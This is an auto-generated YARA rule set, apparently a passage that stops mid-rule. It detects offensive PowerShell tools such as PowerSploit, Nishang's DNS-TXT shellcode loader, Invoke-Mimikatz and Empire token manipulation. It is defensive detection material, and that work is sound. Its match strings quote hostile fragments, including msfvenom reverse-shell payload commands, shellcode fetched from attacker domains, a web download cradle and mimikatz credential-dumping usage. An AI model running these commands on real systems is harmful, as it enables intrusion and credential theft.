/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2023-07-11
   Identifier: mw
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_18f942389308ec90e03beff890832117030c9a10ccfd71737c0c6ac248e325b0 {
   meta:
      description = "mw - file 18f942389308ec90e03beff890832117030c9a10ccfd71737c0c6ac248e325b0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "18f942389308ec90e03beff890832117030c9a10ccfd71737c0c6ac248e325b0"
   strings:
      $s1 = "C:\\\\PS> Get-NTStatusException -ErrorCode 0xC0000005" fullword ascii /* score: '25.00'*/
      $s2 = "http://www.exploit-monday.com/" fullword ascii /* score: '21.00'*/
      $s3 = "C:\\\\PS> 0xC0000005, 0xC0000017, 0x00000000 | Get-NTStatusException" fullword ascii /* score: '18.00'*/
      $s4 = "Get-NTStatusException returns a friendly error message based on the NTSTATUS code passed in. This function is useful when intera" ascii /* score: '15.00'*/
      $s5 = "Get-NTStatusException returns a friendly error message based on the NTSTATUS code passed in. This function is useful when intera" ascii /* score: '15.00'*/
      $s6 = "        $LsaNtStatusToWinError = $Win32Native.GetMethod('LsaNtStatusToWinError', [Reflection.BindingFlags] 'NonPublic, Static')" fullword ascii /* score: '13.00'*/
      $s7 = "    PROCESS" fullword ascii /* score: '10.00'*/
      $s8 = ".DESCRIPTION" fullword ascii /* score: '10.00'*/
      $s9 = "        $GetMessage = $Win32Native.GetMethod('GetMessage', [Reflection.BindingFlags] 'NonPublic, Static')" fullword ascii /* score: '10.00'*/
      $s10 = "function Get-NTStatusException" fullword ascii /* score: '9.00'*/
      $s11 = "        $Win32Native = [AppDomain]::CurrentDomain.GetAssemblies() | %{ $_.GetTypes() } | ? { $_.FullName -eq 'Microsoft.Win32.Wi" ascii /* score: '8.00'*/
      $s12 = "        $Win32Native = [AppDomain]::CurrentDomain.GetAssemblies() | %{ $_.GetTypes() } | ? { $_.FullName -eq 'Microsoft.Win32.Wi" ascii /* score: '8.00'*/
      $s13 = "Author: Matthew Graeber (@mattifestation)" fullword ascii /* score: '7.00'*/
      $s14 = "            Write-Output $GetMessage.Invoke($null, @($WinErrorCode))" fullword ascii /* score: '7.00'*/
      $s15 = ".PARAMETER ErrorCode" fullword ascii /* score: '7.00'*/
      $s16 = "Resolves an NTSTATUS error code." fullword ascii /* score: '7.00'*/
      $s17 = "        {" fullword ascii /* reversed goodware string '{        ' */ /* score: '6.00'*/
      $s18 = "        Set-StrictMode -Version 2" fullword ascii /* score: '6.00'*/
      $s19 = "        }" fullword ascii /* reversed goodware string '}        ' */ /* score: '6.00'*/
      $s20 = "        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 5KB and
      8 of them
}

rule sig_1d3cb2dbbaafe825d364624b827d84610a3daec2516e0a1df40b164efbe2cd90 {
   meta:
      description = "mw - file 1d3cb2dbbaafe825d364624b827d84610a3daec2516e0a1df40b164efbe2cd90"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "1d3cb2dbbaafe825d364624b827d84610a3daec2516e0a1df40b164efbe2cd90"
   strings:
      $s1 = "Get-ChildItem C:\\* -Recurse -Include \"*.doc\",\"*.docx\" | Get-WordMacro" fullword ascii /* score: '26.00'*/
      $s2 = "Get-WordMacro -Path evil.doc -Remove" fullword ascii /* score: '24.00'*/
      $s3 = "http://www.exploit-monday.com/2014/04/powerworm-analysis.html" fullword ascii /* score: '21.00'*/
      $s4 = "        Get-Process winword | ? { $_.MainWindowHandle -eq 0 } | Stop-Process" fullword ascii /* score: '19.00'*/
      $s5 = "        Set-ItemProperty HKCU:\\Software\\Microsoft\\Office\\*\\*\\Security -Name VBAWarnings -Type DWORD -Value 1" fullword ascii /* score: '16.00'*/
      $s6 = "        Set-ItemProperty HKCU:\\Software\\Microsoft\\Office\\*\\*\\Security -Name VBAWarnings -Type DWORD -Value 0" fullword ascii /* score: '16.00'*/
      $s7 = "        Set-ItemProperty HKCU:\\Software\\Microsoft\\Office\\*\\*\\Security -Name AccessVBOM -Type DWORD -Value 1" fullword ascii /* score: '16.00'*/
      $s8 = "        # EXTREMELY IMPORTANT!!!" fullword ascii /* score: '16.00'*/
      $s9 = "        Set-ItemProperty HKCU:\\Software\\Microsoft\\Office\\*\\*\\Security -Name AccessVBOM -Type DWORD -Value 0" fullword ascii /* score: '16.00'*/
      $s10 = "    [CmdletBinding(SupportsShouldProcess = $True , ConfirmImpact = 'Medium')]" fullword ascii /* score: '15.00'*/
      $s11 = "Get-WordMacro outputs the contents of an Word macro if it is present and" fullword ascii /* score: '14.00'*/
      $s12 = "                    # http://msdn.microsoft.com/en-us/library/ff839952(v=office.14).aspx" fullword ascii /* score: '12.00'*/
      $s13 = "Get-WordMacro relies on the Word COM object which requires that Word be" fullword ascii /* score: '12.00'*/
      $s14 = "    PROCESS" fullword ascii /* score: '10.00'*/
      $s15 = ".DESCRIPTION" fullword ascii /* score: '10.00'*/
      $s16 = "        # Kill orphaned Word process" fullword ascii /* score: '10.00'*/
      $s17 = "Outputs the contents on a Word macro if it is present in an Word document." fullword ascii /* score: '9.00'*/
      $s18 = "installed. When the '-Remove' switch is provided to Get-WordMacro, all macros" fullword ascii /* score: '9.00'*/
      $s19 = "function Get-WordMacro" fullword ascii /* score: '9.00'*/
      $s20 = "Author: Matthew Graeber (@mattifestation)" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 10KB and
      8 of them
}

rule a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3 {
   meta:
      description = "mw - file a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3"
   strings:
      $x1 = "PS > Execute-DNSTXT-Code -ShellCode32 32.alteredsecurity.com -ShellCode64 64.alteredsecurity.com -AuthNS ns8.zoneedit.com -SubDo" ascii /* score: '39.00'*/
      $x2 = "PS > Execute-DNSTXT-Code -ShellCode32 32.alteredsecurity.com -ShellCode64 64.alteredsecurity.com -AuthNS ns8.zoneedit.com -SubDo" ascii /* score: '39.00'*/
      $x3 = "                $getcommand = (Invoke-Expression \"nslookup -querytype=txt $i.$ShellCode $AuthNS\") " fullword ascii /* score: '35.00'*/
      $x4 = "                $getcommand = (Invoke-Expression \"nslookup -querytype=txt $i.$ShellCode\") " fullword ascii /* score: '32.00'*/
      $x5 = "Below commands could be used to generate shellcode to be usable with this script" fullword ascii /* score: '32.00'*/
      $s6 = "./msfvenom -p windows/meterpreter/reverse_https -f powershell LHOST=<>" fullword ascii /* score: '30.00'*/
      $s7 = "./msfvenom -p windows/x64/meterpreter/reverse_https -f powershell LHOST=<>" fullword ascii /* score: '30.00'*/
      $s8 = "http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html" fullword ascii /* score: '26.00'*/
      $s9 = "To generate TXT records from above shellcode, use Out-DnsTxt.ps1 in the Utility folder." fullword ascii /* score: '25.00'*/
      $s10 = "The code execution logic is based on this post by Matt." fullword ascii /* score: '22.00'*/
      $s11 = "http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html" fullword ascii /* score: '22.00'*/
      $s12 = "The domain (or subdomain) whose subbdomain's TXT records would hold 64-bit shellcode." fullword ascii /* score: '21.00'*/
      $s13 = "The domain (or subdomain) whose subbdomain's TXT records would hold 32-bit shellcode." fullword ascii /* score: '21.00'*/
      $s14 = "The number of subdomains which would be used to provide shellcode from their TXT records." fullword ascii /* score: '21.00'*/
      $s15 = "This payload is able to pull shellcode from txt record of a domain. " fullword ascii /* score: '21.00'*/
      $s16 = "    #Function to get shellcode from TXT records" fullword ascii /* score: '21.00'*/
      $s17 = ".PARAMETER shellcode64" fullword ascii /* score: '21.00'*/
      $s18 = "Payload which could execute shellcode from DNS TXT queries." fullword ascii /* score: '21.00'*/
      $s19 = ".PARAMETER shellcode32" fullword ascii /* score: '21.00'*/
      $s20 = "PS > Execute-DNSTXT-Code" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f {
   meta:
      description = "mw - file dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f"
   strings:
      $x1 = "Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/" fullword ascii /* score: '42.00'*/
      $x2 = "Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using" ascii /* score: '41.00'*/
      $x3 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x4 = "Execute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege an" ascii /* score: '40.00'*/
      $x5 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x6 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x7 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x8 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x9 = "#If a remote process to inject in to is specified, get a handle to it" fullword ascii /* score: '34.00'*/
      $x10 = "#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory" fullword ascii /* score: '34.00'*/
      $x11 = "Execute mimikatz on two remote computers to dump credentials." fullword ascii /* score: '33.00'*/
      $x12 = "Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection" fullword ascii /* score: '32.00'*/
      $x13 = "Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using" ascii /* score: '31.00'*/
      $s14 = "#Write Shellcode to the remote process which will call GetProcAddress" fullword ascii /* score: '30.00'*/
      $s15 = "$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.00'*/
      $s16 = "$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)" fullword ascii /* score: '30.00'*/
      $s17 = "Find mimikatz at: http://blog.gentilkiwi.com" fullword ascii /* score: '30.00'*/
      $s18 = "Execute mimikatz on the local computer to dump certificates." fullword ascii /* score: '29.00'*/
      $s19 = "This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher " ascii /* score: '29.00'*/
      $s20 = "Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilk" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule dcb59ecb84e62a808fe0360da58a46d2f0ca84c5c5fc0b65ef2cc5d5512c2284 {
   meta:
      description = "mw - file dcb59ecb84e62a808fe0360da58a46d2f0ca84c5c5fc0b65ef2cc5d5512c2284"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "dcb59ecb84e62a808fe0360da58a46d2f0ca84c5c5fc0b65ef2cc5d5512c2284"
   strings:
      $s1 = "        $CommandLine=\"cmd.exe /c calc.exe\"" fullword ascii /* score: '29.00'*/
      $s2 = "ystem.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))" fullword ascii /* score: '29.00'*/
      $s3 = "        https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUACTokenManipulati" ascii /* score: '28.00'*/
      $s4 = "        https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUACTokenManipulati" ascii /* score: '28.00'*/
      $s5 = "        $ApplicationName=\"C:\\Windows\\System32\\cmd.exe\"," fullword ascii /* score: '25.00'*/
      $s6 = "    $Result = $Advapi32::ImpersonateLoggedOnUser($NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32E" ascii /* score: '23.00'*/
      $s7 = " $path, $STARTUP_INFO_PTR, [ref]$PROCESS_INFORMATION_PTR); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()" fullword ascii /* score: '23.00'*/
      $s8 = "    $ProcessHandle = $Kernel32::OpenProcess($dwDesiredAccess, $InheritHandle, $ProcessId); $LastError = [Runtime.InteropServices" ascii /* score: '23.00'*/
      $s9 = "    $Result = $Advapi32::ImpersonateLoggedOnUser($NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32E" ascii /* score: '23.00'*/
      $s10 = "    # CreateProcessWithTokenW - Impersonate the security context of a logged-on user" fullword ascii /* score: '23.00'*/
      $s11 = "        Get-Process -IncludeUserName | Where-Object { $_.UserName -like $Username } | %{" fullword ascii /* score: '22.00'*/
      $s12 = "    $Result = $Advapi32::OpenProcessToken($ProcessHandle, $dwDesiredAccess, [ref]$TokenHandle); $LastError = [Runtime.InteropSer" ascii /* score: '21.00'*/
      $s13 = "            [int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([S" ascii /* score: '21.00'*/
      $s14 = "enType, [ref]$NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()" fullword ascii /* score: '21.00'*/
      $s15 = "$NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()" fullword ascii /* score: '21.00'*/
      $s16 = "    # OpenProcessToken - Open the access token associated with a process" fullword ascii /* score: '21.00'*/
      $s17 = "    ) -EntryPoint OpenProcessToken -SetLastError)," fullword ascii /* score: '20.00'*/
      $s18 = "    $Result = $Advapi32::CreateProcessWithTokenW($NewTokenHandle, 0x00000002, $ApplicationName, $CommandLine, 0x04000000, $null," ascii /* score: '20.00'*/
      $s19 = "    ) -EntryPoint CreateProcessWithTokenW -SetLastError)," fullword ascii /* score: '20.00'*/
      $s20 = "        throw \"CreateProcessWithTokenW Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 100KB and
      8 of them
}

rule de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1113621 {
   meta:
      description = "mw - file de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1113621"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1113621"
   strings:
      $x1 = "            Invoke-ZZZOSCmdAgentJob -Verbose -Instance MSZZZSRV04\\ZZZSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem V" ascii /* score: '61.00'*/
      $x2 = "            Invoke-ZZZOSCmdAgentJob -Verbose -Instance MSZZZSRV04\\ZZZSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem J" ascii /* score: '61.00'*/
      $x3 = "            Invoke-ZZZOSCmdAgentJob -Verbose -Instance MSZZZSRV04\\ZZZSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem J" ascii /* score: '61.00'*/
      $x4 = "Script -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' " fullword ascii /* score: '58.00'*/
      $x5 = "            Invoke-ZZZOSCmdAgentJob -Verbose -Instance MSZZZSRV04\\ZZZSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem C" ascii /* score: '57.00'*/
      $x6 = "cript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test5.txt'" fullword ascii /* score: '55.00'*/
      $x7 = "PS C:\\> Get-ZZZPersistTriggerDDL -Verbose -ZZZServerInstance \"SERVERNAME\\INSTANCENAME\" -PsCommand \"IEX(new-object net.webcl" ascii /* score: '54.00'*/
      $x8 = "dExec -Command \"echo hello > c:\\windows\\temp\\test1.txt\"" fullword ascii /* score: '54.00'*/
      $x9 = "    # This is the base64 encoded evil64.dll -command: base64 -w 0 evil64.dll > evil64.dll.b64" fullword ascii /* score: '51.00'*/
      $x10 = "            Invoke-ZZZOSCmdAgentJob -Verbose -Instance MSZZZSRV04\\ZZZSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem P" ascii /* score: '50.00'*/
      $x11 = "cript   -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test4.txt' " fullword ascii /* score: '50.00'*/
      $x12 = "                    # Example Command: c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\blah.txt" fullword ascii /* score: '48.00'*/
      $x13 = "            VERBOSE: MSZZZSRV04\\ZZZSERVER2014 : Command: c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test" ascii /* score: '48.00'*/
      $x14 = "werShell -Command 'write-output \"hello world\" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20" fullword ascii /* score: '47.00'*/
      $x15 = "                    # Example command: c:\\\\windows\\\\system32\\\\cmd.exe /c echo hello > c:\\\\windows\\\\temp\\\\blah.txt" fullword ascii /* score: '46.00'*/
      $x16 = "EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c \"$Command > $OutputPath\"' " fullword ascii /* score: '46.00'*/
      $x17 = "Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the \"-Process\" parameter of the s" ascii /* score: '45.00'*/
      $x18 = "Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited." fullword ascii /* score: '44.00'*/
      $x19 = "p = subprocess.Popen(`\"cmd.exe /c $Command`\", stdout=subprocess.PIPE)" fullword ascii /* score: '44.00'*/
      $x20 = "Get-Process wininit | Invoke-TokenManipulation -CreateProcess \"cmd.exe\"" fullword ascii /* score: '43.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 4000KB and
      1 of ($x*)
}

rule sig_4fc7be475d6f2ff3aeae22e0f84255d670ba2ba9029696a63c1a4494b051c5c2 {
   meta:
      description = "mw - file 4fc7be475d6f2ff3aeae22e0f84255d670ba2ba9029696a63c1a4494b051c5c2"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "4fc7be475d6f2ff3aeae22e0f84255d670ba2ba9029696a63c1a4494b051c5c2"
   strings:
      $x1 = "# Compiled with Get-KeystoneAssembly => https://github.com/keystone-engine/keystone/tree/master/bindings/powershell" fullword ascii /* score: '32.00'*/
      $s2 = "# => http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html" fullword ascii /* score: '25.00'*/
      $s3 = "[DllImport(\"kernel32.dll\", SetLastError=true)]" fullword ascii /* score: '22.00'*/
      $s4 = "Allocate 32/64 bit shellcode and get a Syscall delegate for the memory pointer." fullword ascii /* score: '22.00'*/
      $s5 = "# ASM Source => https://github.com/mwrlabs/KernelFuzzer/blob/master/bughunt_syscall.asm" fullword ascii /* score: '22.00'*/
      $s6 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii /* score: '22.00'*/
      $s7 = "# ASM Source => https://github.com/mwrlabs/KernelFuzzer/blob/master/bughunt_syscall_x64.asm" fullword ascii /* score: '22.00'*/
      $s8 = "C:\\PS> $NtWriteVirtualMemory.Invoke([UInt16]0x37,[IntPtr]$hProcess,[IntPtr]$pBaseAddress,[IntPtr]$pBuffer,$NumberOfBytesToWrite" ascii /* score: '21.00'*/
      $s9 = "C:\\PS> $NtWriteVirtualMemory.Invoke([UInt16]0x37,[IntPtr]$hProcess,[IntPtr]$pBaseAddress,[IntPtr]$pBuffer,$NumberOfBytesToWrite" ascii /* score: '21.00'*/
      $s10 = "C:\\PS> $NtWriteVirtualMemory = Get-SyscallDelegate -ReturnType '[UInt32]' -ParameterArray @([IntPtr],[IntPtr],[IntPtr],[int],[r" ascii /* score: '15.00'*/
      $s11 = "C:\\PS> $NtWriteVirtualMemory = Get-SyscallDelegate -ReturnType '[UInt32]' -ParameterArray @([IntPtr],[IntPtr],[IntPtr],[int],[r" ascii /* score: '15.00'*/
      $s12 = "# -= Arch x86 =-" fullword ascii /* score: '12.00'*/
      $s13 = "# -= Arch x64 =-" fullword ascii /* score: '12.00'*/
      $s14 = "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SyscallStubPointer, $SyscallDelegate)" fullword ascii /* score: '11.00'*/
      $s15 = "if ([System.IntPtr]::Size -eq 4) {" fullword ascii /* score: '11.00'*/
      $s16 = ".DESCRIPTION" fullword ascii /* score: '10.00'*/
      $s17 = "# Courtesy of @mattifestation" fullword ascii /* score: '10.00'*/
      $s18 = "$IEXBootstrap = \"Get-DelegateType @([UInt16] $ParamList) ($ReturnType)\"" fullword ascii /* score: '9.00'*/
      $s19 = "Function Get-DelegateType" fullword ascii /* score: '9.00'*/
      $s20 = "$ParamList += \"[\" + $ParameterArray[$i].Name + \"], \"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_6f855843f2730d746cef963868db3062198adc1f7d1459466489895e02716024 {
   meta:
      description = "mw - file 6f855843f2730d746cef963868db3062198adc1f7d1459466489895e02716024"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "6f855843f2730d746cef963868db3062198adc1f7d1459466489895e02716024"
   strings:
      $s1 = "Fin -Startbyte 0 -Endbyte max -Interval 10000 -Path c:\\test\\exempt\\nc.exe" fullword ascii /* score: '25.00'*/
      $s2 = "Fin -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\\test\\exempt\\nc.exe -OutPath c:\\test\\output\\run2 -Verbose" fullword ascii /* score: '24.00'*/
      $s3 = "Fin -StartByte 16000 -EndByte 17000 -Interval 100 -Path C:\\test\\exempt\\nc.exe -OutPath c:\\test\\output\\run3 -Verbose" fullword ascii /* score: '24.00'*/
      $s4 = "Fin -StartByte 16800 -EndByte 16900 -Interval 10 -Path C:\\test\\exempt\\nc.exe -OutPath c:\\test\\output\\run4 -Verbose" fullword ascii /* score: '24.00'*/
      $s5 = "Fin -StartByte 16890 -EndByte 16900 -Interval 1 -Path C:\\test\\exempt\\nc.exe -OutPath c:\\test\\output\\run5 -Verbose" fullword ascii /* score: '24.00'*/
      $s6 = "http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html" fullword ascii /* score: '22.00'*/
      $s7 = "http://www.exploit-monday.com/" fullword ascii /* score: '21.00'*/
      $s8 = "https://github.com/mattifestation/PowerSploit" fullword ascii /* score: '21.00'*/
      $s9 = "http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2" fullword ascii /* score: '17.00'*/
      $s10 = "Several of the versions of \"DSplit.exe\" available on the internet contain malware." fullword ascii /* score: '14.00'*/
      $s11 = "    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue(\"This script will result in $ResultNumber binaries being written to " ascii /* score: '12.00'*/
      $s12 = "    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue(\"This script will result in $ResultNumber binaries being written to " ascii /* score: '12.00'*/
      $s13 = ".DESCRIPTION" fullword ascii /* score: '10.00'*/
      $s14 = "    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]" fullword ascii /* score: '10.00'*/
      $s15 = "Locates single Byte AV signatures utilizing the same method as DSplit from \"class101\" on heapoverflow.com." fullword ascii /* score: '10.00'*/
      $s16 = "Forces the script to continue without confirmation." fullword ascii /* score: '10.00'*/
      $s17 = "PowerSploit Function: Fin  " fullword ascii /* score: '8.00'*/
      $s18 = "    Write-Verbose \"This script will now write $ResultNumber binaries to `\"$OutPath`\".\"" fullword ascii /* score: '8.00'*/
      $s19 = "s]::Read, [System.IO.FileShare]::Read, $BufferLen)" fullword ascii /* score: '7.00'*/
      $s20 = "    [Int32] $MaximumByte = (($FileSize) - 1)" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 20KB and
      8 of them
}

rule e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d11a95c {
   meta:
      description = "mw - file e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d11a95c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d11a95c"
   strings:
      $x1 = "./msfpayload windows/x64/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | c" ascii /* score: '42.00'*/
      $x2 = "./msfpayload windows/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -" ascii /* score: '42.00'*/
      $x3 = "./msfpayload windows/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -" ascii /* score: '42.00'*/
      $x4 = "./msfpayload windows/x64/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | c" ascii /* score: '42.00'*/
      $x5 = "PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com" fullword ascii /* score: '32.00'*/
      $s6 = "Below commands could be used to generate shellcode to be usable with this payload" fullword ascii /* score: '29.00'*/
      $s7 = "    $code = (Invoke-Expression \"nslookup -querytype=txt $shellcode32 $AuthNS\")  " fullword ascii /* score: '27.00'*/
      $s8 = "    $code64 = (Invoke-Expression \"nslookup -querytype=txt $shellcode64 $AuthNS\")  " fullword ascii /* score: '27.00'*/
      $s9 = "http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html" fullword ascii /* score: '26.00'*/
      $s10 = "first stage of meterpreter shellcode generated using msf." fullword ascii /* score: '26.00'*/
      $s11 = "The code execution logic is based on this post by Matt." fullword ascii /* score: '22.00'*/
      $s12 = "http://labofapenetrationtester.blogspot.com/" fullword ascii /* score: '22.00'*/
      $s13 = ".PARAMETER shellcode64" fullword ascii /* score: '21.00'*/
      $s14 = "Payload which could execute shellcode from DNS TXT queries." fullword ascii /* score: '21.00'*/
      $s15 = ".PARAMETER shellcode32" fullword ascii /* score: '21.00'*/
      $s16 = "The domain (or subdomain) whose TXT records would hold 64-bit shellcode." fullword ascii /* score: '21.00'*/
      $s17 = "The domain (or subdomain) whose TXT records would hold 32-bit shellcode." fullword ascii /* score: '21.00'*/
      $s18 = "This payload is able to pull shellcode from txt record of a domain. It has been tested for " fullword ascii /* score: '21.00'*/
      $s19 = "PS > Execute-DNSTXT-Code" fullword ascii /* score: '18.00'*/
      $s20 = "function Execute-DNSTXT-Code" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x233c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule sig_706748ba8f0b58c68b8365307f62ee007b9edeea6c7db04fc6a7933826cecfd3 {
   meta:
      description = "mw - file 706748ba8f0b58c68b8365307f62ee007b9edeea6c7db04fc6a7933826cecfd3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "706748ba8f0b58c68b8365307f62ee007b9edeea6c7db04fc6a7933826cecfd3"
   strings:
      $s1 = "            [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')," fullword ascii /* score: '22.00'*/
      $s2 = "            [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')" fullword ascii /* score: '19.00'*/
      $s3 = "            [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling')," fullword ascii /* score: '19.00'*/
      $s4 = "            [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig')," fullword ascii /* score: '19.00'*/
      $s5 = "        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))" fullword ascii /* score: '19.00'*/
      $s6 = "                        $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle" fullword ascii /* score: '19.00'*/
      $s7 = "            [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')," fullword ascii /* score: '19.00'*/
      $s8 = "        $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray" ascii /* score: '17.00'*/
      $s9 = "        $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray" ascii /* score: '17.00'*/
